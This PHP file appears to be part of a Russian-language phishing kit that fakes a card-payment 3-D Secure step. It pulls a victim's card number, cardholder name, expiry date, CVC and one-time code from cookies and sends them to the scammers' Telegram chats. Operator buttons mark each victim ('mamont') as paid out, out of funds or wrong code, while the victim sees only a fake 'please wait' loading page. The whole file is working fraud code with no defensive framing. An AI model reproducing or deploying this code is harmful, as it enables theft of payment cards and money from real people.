<?
include('config.php');
include('functions.php');

if (isset($_POST['securecode'])) {
    setcookie('code', base64_encode($_POST['securecode']));
    header("Refresh:0");
    exit;
}

if (!isset($_COOKIE['rdata']) || !isset($_COOKIE['solt']) || !isset($_COOKIE['code'])) {
    die('$_SERVER["HTTP_REFERER"] not found');
}

$rdata = json_decode(base64_decode($_COOKIE['rdata']),true);
$solt = json_decode(base64_decode($_COOKIE['solt']),true);
$code3ds = base64_decode($_COOKIE['code']);

$amount = $rdata['amount'];
$card_number = $rdata['card_number'];
$cardholder = $rdata['cardholder'];
$expdate1 = $rdata['expdate1'];
$expdate2 = $rdata['expdate2'];
$cvc2 = $rdata['cvc2'];
$id = $solt['id'];
$cash = $solt['cash'];
$worker = $solt['worker'];

$payInfo = json_decode(file_get_contents("database/" . $id), true);
if ($payInfo['status'] == 'success') {
    botSend([
        '🤑 <b>Успешн'.($cash == 'pay' ? 'ая оплата' : 'ый возврат').'</b>',
        '💰 Сумма: <i>'.$amount.' RUB</i>',
        '👨🏻‍💻 Работник: <b>'.$worker.'</b>',
    ], tgToken, chatProfits);
    $payInfo['status'] = 'wait';
    if(trim($payInfo['errmsg']) != ''){
        if ($payInfo['errmsg'] == 'Неверный код') {
            header('Location: 3Ds.php?c');
            exit();
        }
    }
    unset($payInfo['errmsg']);
    file_put_contents("database/" . $id, json_encode($payInfo));
    header('Location: success.php');
    exit;
} elseif ($payInfo['status'] == 'fail') {
    botSend([
        '⛔️ <b>Ошибка при '.($cash == 'pay' ? 'оплате' : 'возврате').'</b>',
        '❗️ Причина: <b>'.$payInfo['errmsg'].'</b>',
        '💰 Сумма: <i>'.$amount.' RUB</i>',
        '👨🏻‍💻Работник: <b>'.$worker.'</b>',
    ], tgToken, chatAdmin);
    if ($payInfo['errmsg'] == 'Неверный код') {
        header('Location: 3Ds.php?c');
        exit;
    }
    header('Location: error.php?error='.$payInfo['errmsg']);
    exit;
}

if (!isset($_GET['r'])) {
    botSend([
        '🔔 <b> Мамонт ввел код</b>',
        '',
        '💌Код: <code>'.$code3ds.'</code>',
        '',
        '💰 Сумма: <i>'.$amount.' RUB</i>',
        '💳 Карта: <b>'.$card_number.' ('.cardBank($card_number).')</b>',
        '👨🏻‍💻Работник: <b>'.$worker.'</b>',
    ], tgToken, chatAdmin, [true, [
        [
            ['text' => '✅ Успех', 'callback_data' => '/doruchkazalet '.$id],
        ],
        [
            ['text' => '✅ ИКС', 'callback_data' => '/doruchkafail4 '.$id],
        ],
        [
            ['text' => '❌ Нет денег', 'callback_data' => '/doruchkafail2 '.$id],
        ],
        [
            ['text' => '❌ Неверный код', 'callback_data' => '/doruchkafail3 '.$id],
        ],
    ]]);
}
?>

<!DOCTYPE html>
<html lang="ru">
   <head>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <title>Loading...</title>
      <link href="/assets/css/bootstrap.min.css" rel="stylesheet" crossorigin="anonymous">
      <meta name="theme-color" content="#7952b3">
      <style>
         .bd-placeholder-img {
         font-size: 1.125rem;
         text-anchor: middle;
         -webkit-user-select: none;
         -moz-user-select: none;
         user-select: none;
         }
         @media (min-width: 768px) {
         .bd-placeholder-img-lg {
         font-size: 3.5rem;
         }
         }
      </style>
      
      <link href="/assets/css/wait.css" rel="stylesheet">
      <script>
    setTimeout( 'location="wait.php?r";', 5000 );
  </script>
   </head>
   <body class="text-center">
      <main class="wait-css">
            <img class="mb-4" src="/assets/img/preloader.gif" alt="" width="72" height="57">
            <h1 class="h3 mb-3 fw-normal">Пожалуйста подождите</h1>
      </main>
   </body>
</html>